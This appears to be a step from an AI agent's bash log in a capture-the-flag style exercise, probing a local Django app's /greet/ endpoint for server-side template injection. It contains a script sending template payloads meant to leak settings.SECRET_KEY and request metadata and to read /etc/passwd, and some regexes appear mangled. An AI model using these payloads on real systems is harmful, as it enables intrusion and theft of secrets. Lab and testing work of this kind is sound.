--- iter 8 bash ---
$ cat <<'EOF'
STATE (iter 7):
- CONFIRMED: /greet/ constructs an inline Django template containing raw name; {{7*7}} reaches Django TemplateSyntaxError with source line '...Hello, {{7*7}}...', callback greet.
- REFUTED: Jinja-style arithmetic not supported; engine is Django Template Language (DTL), not Jinja/Twig/ERB.
- OPEN: DTL SSTI may expose context vars/settings/request or use tags/filters; debug traceback may reveal application source/local variables; need concise probes.
- NEXT: test DTL variables/tags/filters and parse result snippets/errors without dumping full tracebacks.
EOF
python3 <<'PY'
import requests,re,html,hashlib
H={'Host':'localhost'}; url='http://127.0.0.1:9100/greet/'
payloads=['{{ settings.SECRET_KEY }}','{{ request }}','{{ request.META }}','{{ user }}','{% debug %}','{{ True }}','{{ 7|add:7 }}','{% load static %}X','{% include "/etc/passwd" %}','{% lorem 1 w %}']
for p in payloads:
    r=requests.get(url,headers=H,params={'name':p},timeout=5)
    txt=r.text
    title=re.search(r'(.*?)',txt,re.S)
    exc=re.search(r'
        (.*?)
        ',txt,re.S)
    body=re.sub('<[^>]+>',' ',txt)
    body=html.unescape(re.sub(r'\s+',' ',body)).strip()
    print('===',repr(p),'status',r.status_code,'len',len(txt),'sha',hashlib.sha256(r.content).hexdigest()[:8])
    if r.status_code==200:
        print(txt)
    else:
        print('TITLE', html.unescape(title.group(1)).strip() if title else '')
        print('EXC', html.unescape(exc.group(1)).strip() if exc else '')
        for pat in ['/app/','greet','Template(','Context','settings','SECRET','FLAG','flag']:
            if pat in txt: print('contains',pat)
        print('TEXTSNIP', body[:800])
PY
